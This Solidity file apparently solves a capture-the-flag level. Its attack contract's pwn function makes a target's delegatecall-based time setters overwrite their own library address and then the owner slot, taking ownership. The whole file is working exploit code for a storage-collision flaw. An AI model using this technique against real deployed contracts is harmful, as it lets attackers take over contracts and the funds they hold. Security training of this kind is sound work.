// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

contract Preservation {
    address public immutable i_newOwner;
    address public timeZone1Library;
    address public timeZone2Library;
    address public s_owner;

    constructor(address newOwner) {
        i_newOwner = newOwner;
    }

    function setTime(uint256) external {
        s_owner = i_newOwner;
    }

    function pwn(address target) external {
        (bool success, ) = target.call(
            abi.encodeWithSignature("setSecondTime(uint256)", address(this))
        );
        if (!success) revert CallNotSuccess();

        (success, ) = target.call(
            abi.encodeWithSignature("setFirstTime(uint256)", 112)
        );
        if (!success) revert CallNotSuccess();
    }
}
